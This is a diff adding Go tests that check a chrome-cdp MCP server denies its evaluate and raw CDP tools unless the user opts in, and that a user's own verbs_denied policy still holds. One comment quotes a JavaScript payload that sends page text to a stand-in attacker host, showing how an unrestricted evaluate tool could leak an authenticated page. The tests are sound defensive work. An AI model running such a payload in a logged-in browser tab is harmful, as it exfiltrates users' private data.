@@ -897,3 +897,147 @@ func TestMCPCloseIsBoundedByTheAllowList(t *testing.T) {
 		}
 	})
 }
+
+// serveMCPCommand runs the real `mcp` command over a pipe pair — the only way
+// to test what the COMMAND does, as opposed to what mcp.New does with options a
+// test chose. It returns a client session; the server exits when the client
+// disconnects.
+func serveMCPCommand(t *testing.T, app *App, args ...string) *sdk.ClientSession {
+	t.Helper()
+	serverIn, clientOut := io.Pipe()
+	clientIn, serverOut := io.Pipe()
+	app.out = serverOut
+	app.WithInput(serverIn)
+
+	served := make(chan int, 1)
+	go func() { served <- app.Execute(append([]string{"mcp"}, args...)...) }()
+
+	sess, err := sdk.NewClient(&sdk.Implementation{Name: "test", Version: "1"}, nil).
+		Connect(mcpCtx(t), &sdk.IOTransport{Reader: clientIn, Writer: clientOut}, nil)
+	if err != nil {
+		t.Fatalf("connect: %v", err)
+	}
+	t.Cleanup(func() {
+		_ = sess.Close()
+		_ = clientOut.Close()
+		select {
+		case <-served:
+		case <-time.After(mcpTimeout):
+			t.Error("the MCP server did not exit after the client disconnected")
+		}
+	})
+	return sess
+}
+
+func listedTools(t *testing.T, sess *sdk.ClientSession) map[string]bool {
+	t.Helper()
+	res, err := sess.ListTools(mcpCtx(t), nil)
+	if err != nil {
+		t.Fatalf("tools/list: %v", err)
+	}
+	out := map[string]bool{}
+	for _, tl := range res.Tools {
+		out[tl.Name] = true
+	}
+	return out
+}
+
+// MCP mode denies `eval` and `raw` unless the user opts in.
+//
+// The gate offered two ways to satisfy it — the printed config block, which
+// includes verbs_denied, or `chrome-cdp mcp --allow '<origin>'`, which writes no
+// policy file and so set none. The one-liner is the one people paste, and it
+// left `evaluate` (a DEFAULT tool) able to run
+//
+//	location.href='https://attacker.test/x?d='+encodeURIComponent(document.body.innerText)
+//
+// in the authenticated origin: arbitrary script, exfiltration, and a tab walked
+// out of the allow-list, from a server the user believed was bounded.
+func TestMCPDeniesEvalAndRawByDefault(t *testing.T) {
+	t.Parallel()
+
+	t.Run("the recommended one-liner exposes no eval", func(t *testing.T) {
+		t.Parallel()
+		app := New(&fakeBrowser{tabs: mcpTabs}, &bytes.Buffer{}, &bytes.Buffer{})
+		sess := serveMCPCommand(t, app, "--allow", "*.example.com", "--tools", "full")
+		tools := listedTools(t, sess)
+		for _, gone := range []string{"chrome_cdp_evaluate", "chrome_cdp_raw_cdp"} {
+			if tools[gone] {
+				t.Errorf("%s is exposed by a server started with the recommended one-liner", gone)
+			}
+		}
+		// The reading verbs are untouched: this narrows the surface, it does
+		// not turn the server off.
+		for _, kept := range []string{"chrome_cdp_snapshot", "chrome_cdp_read", "chrome_cdp_click"} {
+			if !tools[kept] {
+				t.Errorf("%s was dropped along with eval", kept)
+			}
+		}
+		out, err := sess.CallTool(mcpCtx(t), &sdk.CallToolParams{
+			Name: "chrome_cdp_evaluate", Arguments: map[string]any{"expression": "1+1", "target": "aa11"}})
+		if err != nil {
+			t.Fatalf("tools/call: %v", err)
+		}
+		if !out.IsError {
+			t.Fatalf("evaluate ran on a server that denies it: %v", out.StructuredContent)
+		}
+		got := mcpStructured(t, out)
+		if got["code"] != result.CodeUsage {
+			t.Errorf("code = %v, want %s", got["code"], result.CodeUsage)
+		}
+		if msg, _ := got["message"].(string); !strings.Contains(msg, "policy") {
+			t.Errorf("message = %q, want it to name the policy rather than --tools", msg)
+		}
+	})
+
+	t.Run("the check denies eval too, not only the schema", func(t *testing.T) {
+		t.Parallel()
+		// A tool hidden from tools/list is half the fix; the verb has to be
+		// refused on the ALLOWED origin as well, or `batch` and a stale client
+		// would still reach it.
+		b := refusing(t, mcpTabs...)
+		app, _, _ := appWithPolicy(b, allowOnly("*.example.com"))
+		app.denyEscapeHatchVerbs(false)
+		runner := app.newMCPRunner()
+		env, exit := runner.Run(mcpCtx(t), []string{"eval", "--target", "aa11", "--json", "--", "1+1"})
+		if exit != result.ExitPermission {
+			t.Fatalf("exit = %d, want %d: %s", exit, result.ExitPermission, env)
+		}
+		var got map[string]any
+		if err := json.Unmarshal(env, &got); err != nil {
+			t.Fatalf("envelope: %v\n%s", err, env)
+		}
+		if e, _ := got["error"].(map[string]any); e["rule"] != "verbs_denied: eval" {
+			t.Errorf("rule = %v, want verbs_denied: eval", e)
+		}
+	})
+
+	t.Run("--allow-eval is the opt-in", func(t *testing.T) {
+		t.Parallel()
+		app := New(&fakeBrowser{tabs: mcpTabs}, &bytes.Buffer{}, &bytes.Buffer{})
+		sess := serveMCPCommand(t, app, "--allow", "*.example.com", "--allow-eval", "--tools", "full")
+		tools := listedTools(t, sess)
+		for _, want := range []string{"chrome_cdp_evaluate", "chrome_cdp_raw_cdp"} {
+			if !tools[want] {
+				t.Errorf("--allow-eval did not expose %s", want)
+			}
+		}
+		out := mcpCall(t, sess, "evaluate", map[string]any{"expression": "1+1", "target": "aa11"})
+		if out.IsError {
+			t.Errorf("evaluate failed under --allow-eval: %v", mcpStructured(t, out))
+		}
+	})
+
+	t.Run("a configured verbs_denied still stands", func(t *testing.T) {
+		t.Parallel()
+		// --allow-eval opts back in to the MODE's default, not past the user's
+		// own policy: a config that denies eval keeps denying it.
+		pol := allowOnly("*.example.com")
+		pol.VerbsDenied = []string{"eval"}
+		app, _, _ := appWithPolicy(&fakeBrowser{tabs: mcpTabs}, pol)
+		sess := serveMCPCommand(t, app, "--allow-eval", "--tools", "full")
+		if listedTools(t, sess)["chrome_cdp_evaluate"] {
+			t.Error("--allow-eval overrode the user's own verbs_denied")
+		}
+	})
+}
